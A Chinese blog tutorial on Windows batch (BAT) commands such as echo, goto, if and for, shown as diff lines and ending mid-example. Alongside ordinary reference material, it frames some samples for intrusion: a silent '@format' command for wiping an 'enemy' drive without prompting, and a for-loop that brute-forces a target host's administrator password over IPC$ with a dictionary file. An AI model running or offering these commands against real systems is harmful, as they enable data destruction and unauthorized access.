+	</div>
+ 
+	
+	<div class="w_r">
+		<h4>新人福利，免费薅羊毛</h4>
+					</div>
+	
+
+</div>
+<link rel="stylesheet" type="text/css" href="/wp-content/plugins/google-syntax/google-code-prettify/prettify.css">
+<style>
+.pay{display:flex;justify-content: center;margin: 20px 0;}
+.pay .wxpay{width:160px;margin-right:30px;border-radius:10px;}
+.pay .alipay{width:160px;border-radius:10px;}
+.pay_title{font-size: 20px;font-weight: bold;text-align: center;margin-top:20px;}
+</style>
+<div id="content">
+	
+	<div id="map">
+		<div class="browse">现在位置:   
+			<a title="返回首页" href="/">首页</a> ＞ <a href="/category/%E5%85%B6%E5%AE%83" rel="category tag">Others</a> ＞ 正文</div>
+		<div id="feed"><a href="/feed" title="RSS">RSS</a></div>	
+	</div>
+    
+    <a href="https://www.1bangong.com/?from=post" title="共享办公室出租" target="_blank"><img alt="共享办公室出租" height="150px" width="100%" src="https://oss.yqbg.cn/brand/1bangong.com.jpg"></a>
+
+	<div class="entry_box_s">
+		<div class="entry_title">最全的BAT批处理命令大全</div>
+		<div class="archive_info">
+			<span class="postdate_icon"> 2012-03-24 13:10</span>
+			<span class="category">  <a href="/category/%E5%85%B6%E5%AE%83" rel="category tag">Others</a></span>
+			<span class="article_comment"><a href="/2012/03/24/%E6%9C%80%E5%85%A8%E7%9A%84bat%E6%89%B9%E5%A4%84%E7%90%86%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8.html#respond">暂无评论</a></span>
+			 <span class="article_view grayline">阅读(<span>2,891</span>)</span>			<span class="edit"></span>
+		</div>
+		<div class="entry markdown-body">
+			<div id="entry">
+				<div style="float:right;">
+				<!--ad here-->
+				</div>
+				<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">一<span lang="EN-US">.</span>简单<span class="wp_keywordlink_affiliate"><a href="/tag/%E6%89%B9%E5%A4%84%E7%90%86" title="View all posts in 批处理" target="_blank">批处理</a></span>内部命令简介 </span> <span lang="EN-US"><br>
+<span style="font-family: 宋体;">1.Echo </span> </span> <span style="font-family: 宋体;">命令</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>打开回显或关闭请求回显功能，或显示消息。如果没有任何参数，<span lang="EN-US">echo </span>命令将显示当前回显设置。 </span> <span lang="EN-US"><br>
+<span> <span style="font-family: 宋体;">  </span> </span> </span> <span style="font-family: 宋体;">语法</span> <span lang="EN-US"> <span style="font-family: 宋体;"><br>
+echo [{on│off}] [message]<br>
+</span> <span style="color: #000000;"> <span style="font-family: 宋体;">Sample<span lang="EN-US"><span lang="EN-US">：@echo</span></span></span> </span> <span style="font-family: 宋体;"> off / echo hello world<br>
+</span> </span> <span style="font-family: 宋体;">在实际应用中我们会把这条命令和重定向符号（也称为管道符号，一般用<span lang="EN-US">&gt; &gt;&gt; ^</span>）结合来实现输入一些命令到特定格式的文件中<span lang="EN-US">.</span>这将在以后的例子中体现出来。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">2.@ </span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">命令</span> <span lang="EN-US"> <span style="font-family: 宋体;"><br>
+</span> <span style="color: #000000;"> <span style="font-family: 宋体;"> <span lang="EN-US"> <span lang="EN-US">表示不显示@</span> </span> <span lang="EN-US"> <span lang="EN-US">后面的命令，在入侵过程中（例如使用<span class="wp_keywordlink_affiliate"><a href="/tag/%E6%89%B9%E5%A4%84%E7%90%86" title="View all posts in 批处理" target="_blank">批处理</a></span>来格式化敌人的硬盘）自然不能让对方看到你使用的命令啦</span> </span> </span> </span> </span> <span style="font-family: 宋体;">。</span> <span lang="EN-US"> <span style="font-family: 宋体;"><br>
+</span> <span style="color: #000000;"> <span style="font-family: 宋体;">Sample<span lang="EN-US"><span lang="EN-US">：@echo</span></span></span> </span> <span style="font-family: 宋体;"> off<br>
+@echo Now initializing the program,please wait a minite...<br>
+@format X: /q/u/autoset (format </span> </span> <span style="font-family: 宋体;">这个命令是不可以使用<span lang="EN-US">/y</span>这个参数的，可喜的是微软留了个<span lang="EN-US">autoset</span>这个参数给我们，效果和<span lang="EN-US">/y</span>是一样的。<span lang="EN-US">) </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">3.Goto </span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">命令</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>指定跳转到标签，找到标签后，程序将处理从下一行开始的命令。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>语法：<span lang="EN-US">goto label </span>（<span lang="EN-US">label</span>是参数，指定所要转向的批处理程序中的行。）</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+Sample</span>：</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+if {%1}=={} goto noparms<br>
+if {%2}=={} goto noparms</span>（如果这里的<span lang="EN-US">if</span>、<span lang="EN-US">%1</span>、<span lang="EN-US">%2</span>就是表示变量。）</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+@Rem check parameters if null show usage<br>
+:noparms<br>
+echo Usage: monitor.bat ServerIP PortNumber<br>
+goto end<br>
+<span>  </span></span>标签的名字可以随便起，但是最好是有意义的字母啦，字母前加个：用来表示这个字母是标签，</span> </span> <strong> <span style="font-size: 9pt; font-family: Verdana;" lang="EN-US">:</span> </strong> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">开头的字符行</span> </span> <span style="font-size: 9pt; font-family: Verdana;" lang="EN-US">, </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">在批处理中都被视作标号</span> </span> <span style="font-size: 9pt; font-family: Verdana;" lang="EN-US">, </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">而直接忽略其后的所有内容</span> </span> <span style="font-size: 9pt; font-family: Verdana;" lang="EN-US">, </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">只是为了与正常的标号相区别</span> </span> <span style="font-size: 9pt; font-family: Verdana;" lang="EN-US">, </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">建议使用</span> </span> <span style="font-size: 9pt; font-family: Verdana;" lang="EN-US"> goto </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">所无法识别的标号</span> </span> <span style="font-size: 9pt; font-family: Verdana;" lang="EN-US">, </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">即在</span> </span> <span style="font-size: 9pt; font-family: Verdana;" lang="EN-US"> :</span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">后紧跟一个<strong><span style="font-family: 宋体;">非字母数字</span></strong>的一个特殊符号</span> </span> <span style="font-size: 9pt; font-family: Verdana;" lang="EN-US">.</span> <span style="font-family: 宋体;"> <span style="font-size: 9pt;" lang="EN-US">goto</span> <span style="font-size: 9pt;">命令就是根据这个：来寻找下一步跳到到那里。最好有一些说明这样你别人看起来才会理解你的意图啊。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">4.Rem </span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">命令</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>注释命令，起一个注释的作用，便于别人阅读和你自己日后修改。</span> <span lang="EN-US"> <span style="font-family: 宋体;"><br>
+Rem Message<br>
+</span> <span style="color: #000000;"> <span style="font-family: 宋体;">Sample<span lang="EN-US"><span lang="EN-US">：@Rem</span></span></span> </span> <span style="font-family: 宋体;"> Here is the description. </span> </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">5.Pause </span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">命令</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>运行<span lang="EN-US"> Pause </span>命令时，将显示下面的消息：</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+Press any key to continue . . .<br>
+Sample</span>：</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+@echo off<br>
+:begin<br>
+copy a:*.* d</span>：</span> <span style="font-family: 宋体;"> <span lang="EN-US">/back<br>
+echo Please put a new disk into driver A<br>
+pause<br>
+goto begin<br>
+</span>在这个例子中，驱动器<span lang="EN-US"> A </span>中磁盘上的所有文件均复制到<span lang="EN-US">d:/back</span>中。显示的注释提示您将另一张磁盘放入驱动器<span lang="EN-US"> A </span>时，<span lang="EN-US">pause </span>命令会使程序挂起，以便您更换磁盘，然后按任意键继续处理。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">6.Call </span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">命令</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>从一个批处理程序调用另一个批处理程序，并且不终止父批处理程序。<span lang="EN-US">call </span>命令接受用作调用目标的标签。如果在脚本或批处理文件外使用 <span lang="EN-US">Call</span>，它将不会在命令行起作用。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>语法</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+call [[Drive:][Path] FileName [BatchParameters]] [:label [arguments]]<br>
+</span>参数</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+[Drive:}[Path] FileName<br>
+</span>指定要调用的批处理程序的位置和名称。<span lang="EN-US">filename </span>参数必须具有<span lang="EN-US"> .bat </span>或<span lang="EN-US"> .cmd </span>扩展名。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">7.start </span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">命令</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>调用外部程序，所有的<span lang="EN-US">DOS</span>命令和命令行程序都可以由<span lang="EN-US">start</span>命令来调用。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>入侵常用参数：</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+MIN </span>开始时窗口最小化</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+SEPARATE </span>在分开的空间内开始<span lang="EN-US"> 16 </span>位<span lang="EN-US"> Windows </span>程序</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+HIGH </span>在<span lang="EN-US"> HIGH </span>优先级类别开始应用程序</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+REALTIME </span>在<span lang="EN-US"> REALTIME </span>优先级类别开始应用程序</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+WAIT </span>启动应用程序并等候它结束</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+parameters </span>这些为传送到命令<span lang="EN-US">/</span>程序的参数</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>执行的应用程序是<span lang="EN-US"> 32-</span>位<span lang="EN-US"> GUI </span>应用程序时，<span lang="EN-US">CMD.EXE </span>不等应用程序终止就返回命令提示。如果在命令脚本内执行，该新行为则不会发生。</span> <span style="font-family: 宋体;"> <span lang="EN-US"></span></span></span></p>
+<p>8.choice 命令 <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+choice </span>使用此命令可以让用户输入一个字符，从而运行不同的命令。使用时应该加<span lang="EN-US">/c:</span>参数，<span lang="EN-US">c:</span>后应写提示可输入的字符，之间无空格。它的返回码为</span> <span style="font-family: 宋体;"> <span lang="EN-US">1234......<br>
+</span>如</span> <span style="font-family: 宋体;"> <span lang="EN-US">: choice /c:dme defrag,mem,end<br>
+</span>将显示</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+defrag,mem,end[D,M,E]?<br>
+Sample</span>：</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+Sample.bat</span>的内容如下</span> <span style="font-family: 宋体;"> <span lang="EN-US">:<br>
+@echo off<br>
+choice /c:dme defrag,mem,end<br>
+if errorlevel 3 goto defrag </span>（应先判断数值最高的错误码）</span> <span lang="EN-US"> <span style="font-family: 宋体;"><br>
+if errorlevel 2 goto mem<br>
+if errotlevel 1 goto end </span> </span> </p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">:defrag<br>
+c:/dos/defrag<br>
+goto end<br>
+:mem<br>
+mem<br>
+goto end<br>
+:end<br>
+echo good bye </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">此文件运行后，将显示<span lang="EN-US"> defrag,mem,end[D,M,E]? </span>用户可选择<span lang="EN-US">d m e </span>，然后<span lang="EN-US">if</span>语句将作出判断，<span lang="EN-US">d</span>表示执行标号为<span lang="EN-US">defrag</span>的程序段，<span lang="EN-US">m</span>表示执行标号为<span lang="EN-US">mem</span>的程序段，<span lang="EN-US">e</span>表示执行标号为<span lang="EN-US">end</span>的程序段，每个程序段最后都以<span lang="EN-US">goto end</span>将程序跳到<span lang="EN-US">end</span>标号处，然后程序将显示<span lang="EN-US">good bye</span>，文件结束。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-family: 宋体;"> <span style="font-size: 9pt;" lang="EN-US">9.If </span> <span style="font-size: 9pt;">命令</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">if </span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">表示将判断是否符合规定的条件，从而决定执行不同的命令。 有三种格式</span> <span style="font-family: 宋体;"> <span lang="EN-US">:<br>
+a</span>、<span lang="EN-US">if "</span>参数<span lang="EN-US">" == "</span>字符串<span lang="EN-US">" </span>　待执行的命令</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>参数如果等于指定的字符串，则条件成立，运行命令，否则运行下一句。<span lang="EN-US">(</span>注意是两个等号）</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>如</span> <span lang="EN-US"> <span style="font-family: 宋体;">if "%1"=="a" format a:<br>
+if {%1}=={} goto noparms<br>
+if {%2}=={} goto noparms </span> </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">b</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">、<span lang="EN-US">if exist </span>文件名　 待执行的命令</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>如果有指定的文件，则条件成立，运行命令，否则运行下一句。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>如<span lang="EN-US">if exist config.sys edit config.sys </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">c</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">、<span lang="EN-US">if errorlevel / if not errorlevel </span>数字　待执行的命令</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>如果返回码等于指定的数字，则条件成立，运行命令，否则运行下一句。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>如<span lang="EN-US">if errorlevel 2 goto x2 </span>　</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+DOS</span>程序运行时都会返回一个数字给<span lang="EN-US">DOS</span>，称为错误码<span lang="EN-US">errorlevel</span>或称返回码，常见的返回码为<span lang="EN-US">0</span>、<span lang="EN-US">1</span>。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">10.for </span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">命令</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+for </span>命令是一个比较复杂的命令，主要用于参数在指定的范围内循环执行命令。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>在批处理文件中使用<span lang="EN-US"> FOR </span>命令时，指定变量请使用<span lang="EN-US"> %%variable </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">for {%variable│%%variable} in (set) do command [ CommandLineOptions]<br>
+%variable </span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">指定一个单一字母可替换的参数。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+(set) </span>指定一个或一组文件。可以使用通配符。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+command </span>指定对每个文件执行的命令。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+command-parameters </span>为特定命令指定参数或命令行开关。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>在批处理文件中使用<span lang="EN-US"> FOR </span>命令时，指定变量请使用</span> <span style="font-family: 宋体;"> <span lang="EN-US"> %%variable<br>
+</span>而不要用<span lang="EN-US"> %variable</span>。变量名称是区分大小写的，所以<span lang="EN-US"> %i </span>不同于<span lang="EN-US"> %I </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">如果命令扩展名被启用，下列额外的<span lang="EN-US"> FOR </span>命令格式会受到 支持<span lang="EN-US">: </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">FOR /D %variable IN (set) DO command [command-parameters] </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">如果集中包含通配符，则指定与目录名匹配，而不与文件名匹配。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">FOR /R [[drive:]path] %variable IN (set) DO command [command- </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">检查以<span lang="EN-US"> [drive:]path </span>为根的目录树，指向每个目录中的 <span lang="EN-US">FOR </span>语句。如果在<span lang="EN-US"> /R </span>后没有指定目录，则使用当前 目录。如果集仅为一个单点<span lang="EN-US">(.)</span>字符，则枚举该目录树。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">FOR /L %variable IN (start,step,end) DO command [command-para </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">该集表示以增量形式从开始到结束的一个数字序列。因此，<span lang="EN-US">(1,1,5) </span>将产生序列<span lang="EN-US"> 1 2 3 4 5</span>，<span lang="EN-US">(5,-1,1) </span>将产生 序列<span lang="EN-US"> (5 4 3 2 1)</span>。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">FOR /F ["options"] %variable IN (file-set) DO command<br>
+FOR /F ["options"] %variable IN ("string") DO command<br>
+FOR /F ["options"] %variable IN ('command') DO command </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">或者，如果有<span lang="EN-US"> usebackq </span>选项<span lang="EN-US">: </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">FOR /F ["options"] %variable IN (file-set) DO command<br>
+FOR /F ["options"] %variable IN ("string") DO command<br>
+FOR /F ["options"] %variable IN ('command') DO command </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-family: 宋体;"> <span style="font-size: 9pt;" lang="EN-US">filenameset </span> <span style="font-size: 9pt;">为一个或多个文件名。继续到<span lang="EN-US"> filenameset </span>中的 下一个文件之前，每份文件都已被打开、读取并经过处理。 处理包括读取文件，将其分成一行行的文字，然后将每行 解析成零或更多的符号。然后用已找到的符号字符串变量值调用<span lang="EN-US"> For </span>循环。以默认方式，<span lang="EN-US">/F </span>通过每个文件的每一行中分开的第一个空白符号。跳过空白行。您可通过指定可选<span lang="EN-US"> "options" </span>参数替代默认解析操作。这个带引号的字符串包括一个或多个指定不同解析选项的关键字。这些关键字为<span lang="EN-US">: </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">eol=c - </span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">指一个行注释字符的结尾<span lang="EN-US">(</span>就一个</span> <span style="font-family: 宋体;"> <span lang="EN-US">)<br>
+skip=n - </span>指在文件开始时忽略的行数。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+delims=xxx - </span>指分隔符集。这个替换了空格和跳格键的默认分隔符集。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+tokens=x,y,m-n - </span>指每行的哪一个符号被传递到每个迭代的<span lang="EN-US"> for </span>本身。这会导致额外变量名称的格式为一个范围。通过<span lang="EN-US"> nth </span>符号指定<span lang="EN-US"> m </span>符号字符串中的最后一个字符星号， 那么额外的变量将在最后一个符号解析之分配并接受行的保留文本。 </span> <span lang="EN-US"><br>
+<span style="font-family: 宋体;">usebackq - </span> </span> <span style="font-family: 宋体;">指定新语法已在下类情况中使用<span lang="EN-US">: </span>在作为命令执行一个后引号的字符串并且引号字符为文字字符串命令并允许在<span lang="EN-US"> fi</span>中使用双引号扩起文件名称。 </span> <span lang="EN-US"><br>
+<span style="font-family: 宋体;">sample1:<br>
+FOR /F "eol=; tokens=2,3* delims=, " %i in (myfile.txt) do command </span> </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">会分析<span lang="EN-US"> myfile.txt </span>中的每一行，忽略以分号打头的那些行，将 每行中的第二个和第三个符号传递给<span lang="EN-US"> for </span>程序体；用逗号和<span lang="EN-US">/</span>或空格定界符号。请注意，这个<span lang="EN-US"> for </span>程序体的语句引用<span lang="EN-US"> %i </span>来取得第二个符号，引用<span lang="EN-US"> %j </span>来取得第三个符号，引用<span lang="EN-US"> %k </span>来取得第三个符号后的所有剩余符号。对于带有空格的文件名，您需要用双引号将文件名括起来。为了用这种方式来使用双引号，您还需要使用<span lang="EN-US"> usebackq </span>选项，否则，双引号会被理解成是用作定义某个要分析的字符串的。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-family: 宋体;"> <span style="font-size: 9pt;" lang="EN-US">%i </span> <span style="font-size: 9pt;">专门在<span lang="EN-US"> for </span>语句中得到说明，<span lang="EN-US">%j </span>和<span lang="EN-US"> %k </span>是通过<span lang="EN-US">tokens= </span>选项专门得到说明的。您可以通过<span lang="EN-US"> tokens= </span>一行指定最多<span lang="EN-US"> 26 </span>个符号，只要不试图说明一个高于字母<span lang="EN-US"> 'z' </span>或<span lang="EN-US">'Z' </span>的变量。请记住，<span lang="EN-US">FOR </span>变量是单一字母、分大小写和全局的；同时不能有<span lang="EN-US"> 52 </span>个以上都在使用中。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">您还可以在相邻字符串上使用<span lang="EN-US"> FOR /F </span>分析逻辑；方法是，用单引号将括号之间的<span lang="EN-US"> filenameset </span>括起来。这样，该字符串会被当作一个文件中的一个单一输入行。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">最后，您可以用<span lang="EN-US"> FOR /F </span>命令来分析命令的输出。方法是，将括号之间的<span lang="EN-US"> filenameset </span>变成一个反括字符串。该字符串会被当作命令行，传递到一个子<span lang="EN-US"> CMD.EXE</span>，其输出会被抓进内存，并被当作文件分析。因此，以下例子<span lang="EN-US">: </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">FOR /F "usebackq delims==" %i IN (`set`) DO @echo %i </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">会枚举当前环境中的环境变量名称。另外，<span lang="EN-US">FOR </span>变量参照的替换已被增强。您现在可以使用下列选项语法<span lang="EN-US">: </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">~I - </span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">删除任何引号<span lang="EN-US">(")</span>，扩充</span> <span style="font-family: 宋体;"> <span lang="EN-US"> %I<br>
+%~fI - </span>将<span lang="EN-US"> %I </span>扩充到一个完全合格的路径名</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+%~dI - </span>仅将<span lang="EN-US"> %I </span>扩充到一个驱动器号</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+%~pI - </span>仅将<span lang="EN-US"> %I </span>扩充到一个路径</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+%~nI - </span>仅将<span lang="EN-US"> %I </span>扩充到一个文件名</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+%~xI - </span>仅将<span lang="EN-US"> %I </span>扩充到一个文件扩展名</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+%~sI - </span>扩充的路径只含有短名</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+%~aI - </span>将<span lang="EN-US"> %I </span>扩充到文件的文件属性</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+%~tI - </span>将<span lang="EN-US"> %I </span>扩充到文件的日期<span lang="EN-US">/</span>时间</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+%~zI - </span>将<span lang="EN-US"> %I </span>扩充到文件的大小</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+%~$PATH:I - </span>查找列在路径环境变量的目录，并将<span lang="EN-US"> %I </span>扩充到找到的第一个完全合格的名称。如果环境变量未被定义，或者没有找到文件，此组合键会扩充空字符串</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">可以组合修饰符来得到多重结果<span lang="EN-US">: </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">%~dpI - </span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">仅将<span lang="EN-US"> %I </span>扩充到一个驱动器号和路径</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+%~nxI - </span>仅将<span lang="EN-US"> %I </span>扩充到一个文件名和扩展名</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+%~fsI - </span>仅将<span lang="EN-US"> %I </span>扩充到一个带有短名的完整路径名</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+%~dp$PATH:i - </span>查找列在路径环境变量的目录，并将<span lang="EN-US"> %I </span>扩充到找到的第一个驱动器号和路径。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+%~ftzaI - </span>将<span lang="EN-US"> %I </span>扩充到类似输出线路的<span lang="EN-US"> DIR </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">在以上例子中，<span lang="EN-US">%I </span>和<span lang="EN-US"> PATH </span>可用其他有效数值代替。<span lang="EN-US">%~ </span>语法用一个有效的<span lang="EN-US"> FOR </span>变量名终止。选取类似<span lang="EN-US"> %I </span>的大写变量名比较易读，而且避免与不分大小写的组合键混淆。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">以上是<span lang="EN-US">MS</span>的官方帮助，下面我们举几个例子来具体说明一下<span lang="EN-US">For</span>命令在入侵中的用途。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-family: 宋体;"> <span style="font-size: 9pt;" lang="EN-US">sample2</span> <span style="font-size: 9pt;">：</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">利用<span lang="EN-US">For</span>命令来实现对一台目标<span lang="EN-US">Win2k</span>主机的暴力密码破解。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>我们用<span lang="EN-US">net use <a><span style="color: #000000;">//ip/ipc$</span></a> "password" /u:"administrator"</span>来尝试这和目标主机进行连接，当成功时记下密码。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>最主要的命令是一条：</span> <span lang="EN-US"> <span style="font-family: 宋体;">for /f i% in (dict.txt) do net use </span> <a> <span style="color: #000000; font-family: 宋体;">//ip/ipc$</span> </a> <span style="font-family: 宋体;"> "i%" /u:"administrator"<br>
+</span> </span> <span style="font-family: 宋体;">用<span lang="EN-US">i%</span>来表示<span lang="EN-US">admin</span>的密码，在<span lang="EN-US">dict.txt</span>中这个取<span lang="EN-US">i%</span>的值用<span lang="EN-US">net use </span>命令来连接。然后将程序运行结果传递给<span lang="EN-US">find</span>命令－－</span> <span lang="EN-US"> <span style="font-family: 宋体;"><br>
